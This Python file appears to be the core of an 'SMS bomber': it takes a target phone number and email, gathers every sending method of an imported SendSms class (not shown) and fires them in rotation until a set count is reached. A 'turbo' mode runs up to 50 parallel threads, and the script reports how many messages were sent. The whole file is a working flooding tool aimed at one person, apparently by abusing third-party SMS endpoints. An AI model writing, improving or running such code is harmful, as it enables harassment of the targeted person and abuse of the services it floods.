from sms import SendSms
import threading

def is_enough(phone, email, count, mode):
    sms = SendSms(phone, email)
    servisler_sms = []

    for attr in dir(SendSms):
        if callable(getattr(SendSms, attr)) and not attr.startswith('__'):
            servisler_sms.append(attr)

    lock = threading.Lock()
    sent_count = 0
    failed_count = 0
    total_attempts = 0
    servis_index = [0] * min(50, len(servisler_sms))  # 50 paralel istek

    def run_service(thread_id):
        nonlocal sent_count, failed_count, total_attempts
        local_index = 0
        while True:
            with lock:
                if total_attempts >= count:
                    return
                if local_index >= len(servisler_sms):
                    local_index = 0
                func = servisler_sms[local_index]
                local_index += 1
                total_attempts += 1
            try:
                getattr(sms, func)()
                with lock:
                    sent_count += 1
            except Exception:
                with lock:
                    failed_count += 1

    if mode == "turbo":
        threads = []
        for i in range(min(50, len(servisler_sms))):  # Maks 50 paralel thread
            t = threading.Thread(target=run_service, args=(i,))
            threads.append(t)
            t.start()
        for t in threads:
            t.join()
    else:
        for _ in range(count):
            with lock:
                if total_attempts >= count:
                    break
                func = servisler_sms[total_attempts % len(servisler_sms)]
                total_attempts += 1
            try:
                getattr(sms, func)()
                sent_count += 1
            except Exception:
                failed_count += 1

    print(f"[+] Başarılı! {sent_count} SMS gönderildi")
    for _ in range(failed_count):
        print("[-] Başarısız!")
    return sent_count, failed_count
